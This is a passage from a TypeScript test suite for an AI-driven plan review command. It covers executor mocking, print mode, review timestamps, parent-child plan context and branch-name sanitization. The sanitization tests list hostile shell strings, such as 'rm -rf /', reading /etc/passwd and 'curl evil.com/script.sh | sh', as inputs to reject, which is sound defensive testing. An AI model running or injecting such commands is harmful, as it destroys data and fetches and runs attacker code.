          tasks: [
            {
              title: 'Test task',
              description: 'Integration test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockImplementation(
      (executorName: string, options: any) => {
        expect(executorName).toBe('claude-code');
        expect(options.baseDir).toBe(testDir);
        return mockExecutor as any;
      }
    );

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: `REVIEWER AGENT\n\n${contextContent}`,
        }) as any
    );

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue(null);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(123, { executor: 'claude-code' }, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('passes executionMode review to executor for review-only operation', async () => {
    await writePlanToDb(
      {
        id: 123,
        title: 'Test Review Execution',
        goal: 'Test that review command uses review execution mode',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task for review execution mode',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );
    const materializedPlanPath = join(testDir, '.tim', 'plans', '123.plan.md');

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, planInfo: any) => {
        // Verify that executionMode is set to 'review'
        expect(planInfo.executionMode).toBe('review');
        expect(planInfo.planId).toBe('123');
        expect(planInfo.planTitle).toBe('Test Review Execution');
        expect(planInfo.planFilePath).toBe(materializedPlanPath);
        expect(planInfo.captureOutput).toBe('result');
        return JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        });
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '123',
        planData: {
          id: 123,
          title: 'Test Review Execution',
          goal: 'Test that review command uses review execution mode',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task for review execution mode',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue(null);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(123, {}, mockCommand);

    // Verify the executor was called with correct executionMode
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);

    // The assertions for executionMode are in the mock function above
    // which will throw if the values don't match expected
  });

  test('respects dry-run option', async () => {
    const mockExecutor = {
      execute: vi.fn(async () => 'Should not be called'),
    };

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: join(testDir, 'dry-run.yml'),
        planData: {
          id: 1,
          title: 'Dry Run Test',
          goal: 'Test dry run functionality',
          tasks: [
            {
              title: 'Test task',
              description: 'Dry run test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        },
      }) as any
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'Generated prompt for dry run',
    } as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(1, { dryRun: true }, mockCommand);

    // Executor should not be called in dry-run mode
    expect(mockExecutor.execute).not.toHaveBeenCalled();
  });

  test('print mode forces json output without prompting', async () => {
    const planFile = join(testDir, 'print-mode.yml');
    await writePlanToDb(
      {
        id: 1,
        title: 'Print Mode Plan',
        goal: 'Test print mode',
        tasks: [
          {
            title: 'Task One',
            description: 'First task',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    const mockExecutor = {
      execute: vi.fn(async () =>
        JSON.stringify({
          issues: [
            {
              severity: 'minor',
              category: 'style',
              content: 'Use consistent formatting.',
              file: 'src/test.ts',
              line: '10',
              suggestion: 'Run the formatter.',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      ),
    };

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 1,
          title: 'Print Mode Plan',
          goal: 'Test print mode',
          tasks: [
            {
              title: 'Task One',
              description: 'First task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'codex-cli',
      review: {
        autoSave: false,
      },
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue(null);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    const stdoutWrites: string[] = [];
    const originalConsoleLog = console.log;
    console.log = (...args: unknown[]) => {
      stdoutWrites.push(args.map((arg) => String(arg)).join(' '));
    };

    vi.mocked(loggingModule.log).mockImplementation((value: string) => {
      stdoutWrites.push(String(value));
    });

    try {
      await handleReviewCommand(
        '1',
        {
          print: true,
          format: 'terminal',
          verbosity: 'normal',
          noSave: true,
        },
        mockCommand
      );
    } finally {
      console.log = originalConsoleLog;
    }

    const output = stdoutWrites.join('').trim();
    const jsonStart = output.indexOf('{');
    const jsonEnd = output.lastIndexOf('}');
    if (jsonStart === -1 || jsonEnd === -1 || jsonEnd <= jsonStart) {
      throw new Error(`Expected JSON output, got: ${output}`);
    }
    const parsed = JSON.parse(output.slice(jsonStart, jsonEnd + 1));
    expect(parsed.planId).toBe('1');
    expect(parsed.issues).toHaveLength(1);
  });
});

describe('structuralReviewAt write path', () => {
  const ISO_TIMESTAMP_RE = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/;

  function mockCleanReview(planId: number, planData: Record<string, unknown>) {
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'codex-cli',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: String(planId),
        planData,
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/example.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue('main');
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'mock reviewer prompt',
    } as any);
  }

  test('a successful --structural-only review sets structuralReviewAt and persists it to the DB', async () => {
    await writePlanToDb(
      {
        id: 501,
        title: 'Structural Review Plan',
        goal: 'Verify structural marker is set',
        tasks: [{ title: 'Existing task', description: 'Existing work' }],
      },
      { cwdForIdentity: testDir }
    );

    mockCleanReview(501, {
      id: 501,
      title: 'Structural Review Plan',
      goal: 'Verify structural marker is set',
      tasks: [{ title: 'Existing task', description: 'Existing work' }],
    });

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue({
      execute: vi.fn(async () =>
        JSON.stringify({ issues: [], recommendations: [], actionItems: [] })
      ),
    } as any);

    const mockCommand = { parent: { opts: () => ({}) } };

    await handleReviewCommand(501, { structuralOnly: true, noSave: true }, mockCommand);

    const { plan: afterReview } = await resolvePlanByNumericId(501, testDir);
    expect(afterReview.structuralReviewAt).toEqual(expect.any(String));
    expect(afterReview.structuralReviewAt).toMatch(ISO_TIMESTAMP_RE);

    // Query the column directly to confirm the value reached the DB, rather
    // than only mutating the plan object passed to writePlanFile.
    const storedRow = getDatabase()
      .prepare(`SELECT structural_review_at FROM plan WHERE plan_id = ?`)
      .get(501) as { structural_review_at: string | null } | undefined;
    expect(storedRow?.structural_review_at).toBe(afterReview.structuralReviewAt);
  });

  test('a successful --structural-only review in print mode still sets structuralReviewAt (regression: orchestrator always uses --print)', async () => {
    await writePlanToDb(
      {
        id: 502,
        title: 'Structural Review Plan Print Mode',
        goal: 'Verify structural marker is set under --print',
        tasks: [{ title: 'Existing task', description: 'Existing work' }],
      },
      { cwdForIdentity: testDir }
    );

    mockCleanReview(502, {
      id: 502,
      title: 'Structural Review Plan Print Mode',
      goal: 'Verify structural marker is set under --print',
      tasks: [{ title: 'Existing task', description: 'Existing work' }],
    });

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue({
      execute: vi.fn(async () =>
        JSON.stringify({ issues: [], recommendations: [], actionItems: [] })
      ),
    } as any);

    const mockCommand = { parent: { opts: () => ({}) } };

    await handleReviewCommand(
      502,
      { structuralOnly: true, noSave: true, print: true },
      mockCommand
    );

    const { plan: afterReview } = await resolvePlanByNumericId(502, testDir);
    expect(afterReview.structuralReviewAt).toMatch(ISO_TIMESTAMP_RE);
  });

  test('a structural review whose executor throws does not set structuralReviewAt', async () => {
    await writePlanToDb(
      {
        id: 503,
        title: 'Structural Review Failure Plan',
        goal: 'Verify structural marker is not set on failure',
        tasks: [{ title: 'Existing task', description: 'Existing work' }],
      },
      { cwdForIdentity: testDir }
    );

    mockCleanReview(503, {
      id: 503,
      title: 'Structural Review Failure Plan',
      goal: 'Verify structural marker is not set on failure',
      tasks: [{ title: 'Existing task', description: 'Existing work' }],
    });

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue({
      execute: vi.fn(async () => {
        throw new Error('executor exploded');
      }),
    } as any);

    const mockCommand = { parent: { opts: () => ({}) } };

    await expect(
      handleReviewCommand(503, { structuralOnly: true, noSave: true }, mockCommand)
    ).rejects.toThrow('executor exploded');

    const { plan: afterReview } = await resolvePlanByNumericId(503, testDir);
    expect(afterReview.structuralReviewAt).toBeUndefined();
  });

  test('a non-structural review never sets or touches structuralReviewAt', async () => {
    const priorStructuralReviewAt = '2026-01-01T00:00:00.000Z';
    await writePlanToDb(
      {
        id: 504,
        title: 'Ordinary Review Plan',
        goal: 'Verify ordinary reviews do not touch the structural marker',
        structuralReviewAt: priorStructuralReviewAt,
        tasks: [{ title: 'Existing task', description: 'Existing work' }],
      },
      { cwdForIdentity: testDir }
    );

    mockCleanReview(504, {
      id: 504,
      title: 'Ordinary Review Plan',
      goal: 'Verify ordinary reviews do not touch the structural marker',
      tasks: [{ title: 'Existing task', description: 'Existing work' }],
    });

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue({
      execute: vi.fn(async () =>
        JSON.stringify({ issues: [], recommendations: [], actionItems: [] })
      ),
    } as any);

    const mockCommand = { parent: { opts: () => ({}) } };

    await handleReviewCommand(504, { noSave: true }, mockCommand);

    const { plan: afterReview } = await resolvePlanByNumericId(504, testDir);
    expect(afterReview.structuralReviewAt).toBe(priorStructuralReviewAt);
  });
});

describe('Parent plan context handling', () => {
  test('includes parent context when plan has a parent', async () => {
    const parentPlan: PlanSchema = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement a new tim review command that analyzes code changes against plan requirements',
      details:
        'The review command will compare the current branch to the trunk branch, gather all relevant plan context',
      tasks: [],
    };

    const childPlan: PlanSchema = {
      id: 101,
      title: 'PR review command - Parent-Child Plan Integration',
      goal: 'Enhance the review command to intelligently handle plan hierarchies',
      details:
        'Extend the review command to automatically include relevant context from parent plans',
      parent: 99,
      tasks: [
        {
          title: 'Implement parent plan context gathering',
          description:
            'Add logic to detect when a plan has a parent and automatically include parent context',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/tim/commands/review.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff content',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(childPlan, diffResult, true, false, [parentPlan], []);

    // Verify parent context is included
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** PR review command');
    expect(prompt).toContain('**Parent Goal:** Implement a new tim review command');
    expect(prompt).toContain(
      'This review is for a child plan implementing part of the parent plan above.'
    );

    // Verify child plan context still included
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');
    expect(prompt).toContain('**Title:** PR review command - Parent-Child Plan Integration');
  });

  test('works normally when plan has no parent', async () => {
    const planData: PlanSchema = {
      id: 42,
      title: 'Standalone Plan',
      goal: 'A plan without a parent',
      tasks: [
        {
          title: 'Task 1',
          description: 'A simple task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    // Should not include parent context
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('Parent Plan ID');

    // Should still include normal plan context
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 42');
    expect(prompt).toContain('**Title:** Standalone Plan');
  });

  test('continues without parent context when parent plan is missing', async () => {
    // This test ensures the review works even if parent plan cannot be found
    const childPlan: PlanSchema = {
      id: 101,
      title: 'Child Plan',
      goal: 'A child plan with missing parent',
      parent: 99, // Parent ID exists but plan will not be found
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    // Test with undefined parent (simulating missing parent)
    const prompt = buildReviewPrompt(childPlan, diffResult, true, false, [], []);

    // Should not include parent context when parent is missing
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('Parent Plan ID');

    // Should still include child plan context
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');
    expect(prompt).toContain('**Title:** Child Plan');
  });

  test('handles parent plan context integration in handleReviewCommand', async () => {
    const childPlanFile = join(testDir, 'child-101.yml');
    await writePlanToDb(
      {
        id: 101,
        title: 'Child Plan',
        goal: 'Child goal that implements parent',
        parent: 99,
        tasks: [
          {
            title: 'Child task',
            description: 'A child task',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );
    const parentPlan = {
      id: 99,
      title: 'Parent Plan',
      goal: 'Parent goal for context',
      details: 'This is the parent plan providing context',
      tasks: [
        {
          title: 'Parent task',
          description: 'A parent task',
        },
      ],
      filename: join(testDir, '.tim', 'plans', '99.plan.md'),
    };
    const gatherPlanContextMock = vi.fn(async () =>
      createMockPlanContext({
        resolvedPlanFile: childPlanFile,
        planData: {
          id: 101,
          title: 'Child Plan',
          goal: 'Child goal that implements parent',
          parent: 99,
          tasks: [
            {
              title: 'Child task',
              description: 'A child task',
            },
          ],
        },
        parentChain: [parentPlan],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        },
      })
    );

    const mockExecutor = {
      execute: vi.fn(async (prompt: string) => {
        // Verify the prompt includes parent context
        expect(prompt).toContain('# Parent Plan Context');
        expect(prompt).toContain('**Parent Plan ID:** 99');
        expect(prompt).toContain('**Parent Title:** Parent Plan');
        return JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        });
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'codex-cli',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockImplementation(gatherPlanContextMock);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const mockCommand = {
      parent: {
        opts: () => ({
          config: testDir,
        }),
      },
    };

    await handleReviewCommand(101, {}, mockCommand);

    expect(gatherPlanContextMock).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });
});

describe('Hierarchy integration with utilities', () => {
  test('handles multiple levels of parent plans', async () => {
    const grandparentPlan: PlanWithFilename = {
      id: 50,
      title: 'Root Project Plan',
      goal: 'Implement the entire project',
      details: 'This is the top-level project plan',
      tasks: [],
      filename: 'grandparent-50.yml',
    };

    const parentPlan: PlanWithFilename = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement review functionality',
      details: 'Mid-level plan for review features',
      parent: 50,
      tasks: [],
      filename: 'parent-99.yml',
    };

    const childPlan: PlanSchema = {
      id: 101,
      title: 'PR review command - Parent-Child Integration',
      goal: 'Enhance review command with hierarchy support',
      parent: 99,
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/review.ts'],
      baseBranch: 'main',
      diffContent: 'test diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    // Test with multi-level parent chain
    const parentChain = [parentPlan, grandparentPlan];
    const prompt = buildReviewPrompt(childPlan, diffResult, true, false, parentChain, []);

    // Verify both parent levels are included
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** PR review command');
    expect(prompt).toContain('**Grandparent (Level 2) Plan ID:** 50');
    expect(prompt).toContain('**Grandparent (Level 2) Title:** Root Project Plan');
    expect(prompt).toContain('---'); // Section separator
    expect(prompt).toContain(
      'This review is for a child plan implementing part of the parent plans above'
    );
  });

  test('includes completed children when reviewing parent plan', async () => {
    const parentPlan: PlanSchema = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement complete review functionality',
      tasks: [
        {
          title: 'Parent task',
          description: 'High-level task',
        },
      ],
    };

    const completedChild1: PlanWithFilename = {
      id: 100,
      title: 'Core Review Implementation',
      goal: 'Implement basic review command',
      details: 'This child handles the core review logic',
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-100.yml',
    };

    const completedChild2: PlanWithFilename = {
      id: 101,
      title: 'Parent-Child Integration',
      goal: 'Add hierarchy support to review',
      details: 'This child adds parent-child relationship handling',
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-101.yml',
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/review.ts', 'src/hierarchy.ts'],
      baseBranch: 'main',
      diffContent: 'parent review diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const completedChildren = [completedChild1, completedChild2];
    const prompt = buildReviewPrompt(parentPlan, diffResult, true, false, [], completedChildren);

    // Verify completed children section is included
    expect(prompt).toContain('# Completed Child Plans');
    expect(prompt).toContain(
      'The following child plans have been completed as part of this parent plan:'
    );
    expect(prompt).toContain('**Child Plan ID:** 100');
    expect(prompt).toContain('**Child Title:** Core Review Implementation');
    expect(prompt).toContain('**Child Goal:** Implement basic review command');
    expect(prompt).toContain('**Child Plan ID:** 101');
    expect(prompt).toContain('**Child Title:** Parent-Child Integration');
    expect(prompt).toContain(
      'consider how these completed children contribute to the overall goals'
    );
  });

  test('handles both parent chain and completed children together', async () => {
    const grandparentPlan: PlanWithFilename = {
      id: 50,
      title: 'Project Root',
      goal: 'Top level goal',
      tasks: [],
      filename: 'grandparent-50.yml',
    };

    const parentPlan: PlanWithFilename = {
      id: 99,
      title: 'Middle Plan',
      goal: 'Middle level goal',
      parent: 50,
      tasks: [],
      filename: 'parent-99.yml',
    };

    const currentPlan: PlanSchema = {
      id: 101,
      title: 'Current Plan',
      goal: 'Current plan goal',
      parent: 99,
      tasks: [
        {
          title: 'Current task',
          description: 'Task description',
        },
      ],
    };

    const completedChild: PlanWithFilename = {
      id: 102,
      title: 'Completed Child',
      goal: 'Child goal',
      status: 'done',
      parent: 101,
      tasks: [],
      filename: 'child-102.yml',
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'complex diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const parentChain = [parentPlan, grandparentPlan];
    const completedChildren = [completedChild];
    const prompt = buildReviewPrompt(
      currentPlan,
      diffResult,
      true,
      false,
      parentChain,
      completedChildren
    );

    // Verify both parent and children contexts are included in correct order
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Grandparent (Level 2) Plan ID:** 50');

    expect(prompt).toContain('# Completed Child Plans');
    expect(prompt).toContain('**Child Plan ID:** 102');

    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');

    // Verify order: parent context, then children context, then current plan context
    const parentIndex = prompt.indexOf('# Parent Plan Context');
    const childrenIndex = prompt.indexOf('# Completed Child Plans');
    const planIndex = prompt.indexOf('# Plan Context');

    expect(parentIndex).toBeLessThan(childrenIndex);
    expect(childrenIndex).toBeLessThan(planIndex);
  });

  test('handles plan without ID gracefully', async () => {
    const planWithoutId: PlanSchema = {
      // No ID field
      title: 'Plan Without ID',
      goal: 'Test plan without ID',
      tasks: [
        {
          title: 'Test task',
          description: 'Task description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'simple diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    // Should not attempt hierarchy traversal without an ID
    const prompt = buildReviewPrompt(planWithoutId, diffResult, true, false, [], []);

    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('# Completed Child Plans');
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Title:** Plan Without ID');
  });

  test('handles empty parent chain and children arrays', async () => {
    const simplePlan: PlanSchema = {
      id: 1,
      title: 'Simple Plan',
      goal: 'Simple goal',
      tasks: [
        {
          title: 'Simple task',
          description: 'Simple description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['simple.ts'],
      baseBranch: 'main',
      diffContent: 'simple diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(simplePlan, diffResult, true, false, [], []);

    // Should work like before - no parent or children sections
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('# Completed Child Plans');
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 1');
    expect(prompt).toContain('**Title:** Simple Plan');
  });

  test('handles plan hierarchy with missing plan details gracefully', async () => {
    const parentWithoutDetails: PlanWithFilename = {
      id: 99,
      title: 'Parent Plan',
      goal: 'Parent goal',
      // No details field
      tasks: [],
      filename: 'parent-99.yml',
    };

    const childWithoutDetails: PlanWithFilename = {
      id: 101,
      title: 'Child Plan',
      goal: 'Child goal',
      // No details field
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-101.yml',
    };

    const currentPlan: PlanSchema = {
      id: 100,
      title: 'Current Plan',
      goal: 'Current goal',
      parent: 99,
      tasks: [
        {
          title: 'Task',
          description: 'Description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'test diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(
      currentPlan,
      diffResult,
      true,
      false,
      [parentWithoutDetails],
      [childWithoutDetails]
    );

    // Should include basic info but not try to include missing details
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** Parent Plan');
    expect(prompt).toContain('**Parent Goal:** Parent goal');
    expect(prompt).not.toContain('**Parent Details:**');

    expect(prompt).toContain('**Child Plan ID:** 101');
    expect(prompt).toContain('**Child Title:** Child Plan');
    expect(prompt).toContain('**Child Goal:** Child goal');
    expect(prompt).not.toContain('**Child Details:**');
  });
});

// Security tests for the implemented security fixes
describe('Security fixes', () => {
  describe('Branch name sanitization', () => {
    test('rejects branch name with command injection attempts', async () => {
      // Test branch names that could potentially be used for command injection
      const maliciousBranches = [
        'main; rm -rf /',
        'main && echo "hacked"',
        'main | cat /etc/passwd',
        'main`echo hacked`',
        'main$(echo hacked)',
        'main & echo hacked &',
        'main\nrm -rf /',
        'main; cat /etc/passwd > output.txt',
        'main || curl evil.com/script.sh | sh',
        '../../../main',
        '..\\..\\main',
      ];

      for (const maliciousBranch of maliciousBranches) {
        // Test the sanitization function directly
        expect(() => sanitizeBranchName(maliciousBranch)).toThrow('Invalid branch name format');
      }
    });

    test('accepts valid branch names', async () => {
      const validBranches = [
        'main',
        'master',
        'feature/new-feature',
        'bugfix/issue-123',
        'release-1.0.0',
        'dev',
        'staging',
        'feature_branch',
        'hotfix.urgent',
        'user/john/feature',
        'v1.2.3',
      ];

      for (const validBranch of validBranches) {
        // Test the sanitization function directly instead of the full generateDiffForReview
        // since mocking Bun's $ utility is complex

        // Should not throw an error for valid branch names
        expect(() => sanitizeBranchName(validBranch)).not.toThrow();
        expect(sanitizeBranchName(validBranch)).toBe(validBranch);
      }
    });

    test('sanitizes branch name in both git and jj modes', async () => {
      const maliciousBranch = 'main; rm -rf /';

      // Test the sanitization function directly - it should reject malicious input
      expect(() => sanitizeBranchName(maliciousBranch)).toThrow('Invalid branch name format');

      // The sanitizeBranchName function is used in both git and jj code paths in generateDiffForReview
      // So testing it directly verifies protection in both modes
    });
  });

  describe('Input validation for plan files', () => {
    test('validates multiple tasks correctly', async () => {
      vi.mocked(contextGatheringModule.gatherPlanContext).mockRejectedValue(
        new Error('tasks.1.title: Invalid input: expected string, received undefined')
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(1, {}, mockCommand)).rejects.toThrow(
        'tasks.1.title: Invalid input: expected string, received undefined'
      );
    });
  });

  describe('Large diff protection', () => {
    test('has correct size limit constant', async () => {
      // Test that the MAX_DIFF_SIZE constant is properly set to 10MB
      const reviewModule = await import('./review.js');
      // We can't directly access the constant, but we can test the logic indirectly

      // Create a string that exceeds 10MB (10 * 1024 * 1024 bytes)
      const largeDiff = 'a'.repeat(11 * 1024 * 1024); // 11MB
      const largeDiffSizeInBytes = Buffer.byteLength(largeDiff, 'utf8');

      expect(largeDiffSizeInBytes).toBeGreaterThan(10 * 1024 * 1024);

      // The protection logic uses Buffer.byteLength to check size, which is the right approach
      // for UTF-8 string length checking
    });

    test('diff size calculation works correctly', () => {
      // Test that byte length calculation works correctly for different string types
      const smallString = 'hello';
      const mediumString = 'a'.repeat(1024); // 1KB
      const unicodeString = '🔒'.repeat(100); // Unicode characters take more bytes

      expect(Buffer.byteLength(smallString, 'utf8')).toBe(5);
      expect(Buffer.byteLength(mediumString, 'utf8')).toBe(1024);
      expect(Buffer.byteLength(unicodeString, 'utf8')).toBeGreaterThan(100); // Unicode takes more bytes
    });
  });

  describe('Error handling improvements', () => {
    test('error message format includes exit codes and stderr', () => {
      // Test that our error message format includes the expected information
      const exitCode = 128;
      const stderr = 'fatal: not a git repository';
      const expectedMessage = `git diff --name-only command failed (exit code ${exitCode}): ${stderr}`;

      expect(expectedMessage).toContain('git diff --name-only command failed');
      expect(expectedMessage).toContain('exit code 128');
      expect(expectedMessage).toContain('fatal: not a git repository');
    });

    test('jj error message format includes exit codes and stderr', () => {
      // Test that our jj error message format includes the expected information
      const exitCode = 1;
      const stderr = 'Error: No jj repo in current directory';
      const expectedMessage = `jj diff --summary command failed (exit code ${exitCode}): ${stderr}`;

      expect(expectedMessage).toContain('jj diff --summary command failed');
      expect(expectedMessage).toContain('exit code 1');
      expect(expectedMessage).toContain('Error: No jj repo in current directory');
    });

    test('error context wrapping format', () => {
      // Test that error wrapping preserves the original error message
      const originalError = 'Unexpected error';
      const wrappedMessage = `Failed to generate git diff: ${originalError}`;

      expect(wrappedMessage).toContain('Failed to generate git diff');
      expect(wrappedMessage).toContain('Unexpected error');
    });

    test('handles executor errors properly in review command', async () => {
      await writePlanToDb(
        {
          id: 1,
